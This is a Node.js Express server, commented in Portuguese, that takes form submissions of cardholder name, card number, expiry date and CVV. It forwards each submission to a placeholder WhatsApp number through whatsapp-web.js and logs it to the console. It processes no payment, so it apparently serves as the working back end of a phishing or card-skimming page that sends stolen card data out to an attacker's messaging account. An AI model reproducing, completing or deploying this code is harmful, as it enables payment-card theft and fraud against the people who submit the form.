const express = require('express');
const bodyParser = require('body-parser');
const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');

const client = new Client({
    authStrategy: new LocalAuth()
});

client.once('ready', () => {
    console.log('Client is ready!');
});


client.on('qr', (qr) => {
    qrcode.generate(qr, { small: true });
});

client.initialize();

const app = express();
const port = 3000;


app.use(bodyParser.urlencoded({ extended: true }));


app.use(express.static(__dirname));

app.post('/submit', async (req, res) => {
    const { name, cardNumber, expiryDate, cvv } = await req.body;

    try {
        await client.sendMessage('55(NUMERO PARA SER ENVIADO)@c.us',
            `Dados recebidos: \n nome: *${name}* \n numero: *${cardNumber}* \n data: *${expiryDate}* \n cvv: *${cvv}*`);
        console.log(`Dados recebidos: \n nome: ${name} \n numero: ${cardNumber} \n data: ${expiryDate} \n cvv:${cvv} \n`);
        res.send('Dados enviados com sucesso!');
    } catch (error) {
        console.error('Erro ao enviar a mensagem:', error);
        res.status(500).send('Erro ao enviar os dados.');
    }
});

app.listen(port, () => {
    console.log(`Servidor rodando na porta ${port}`);
});
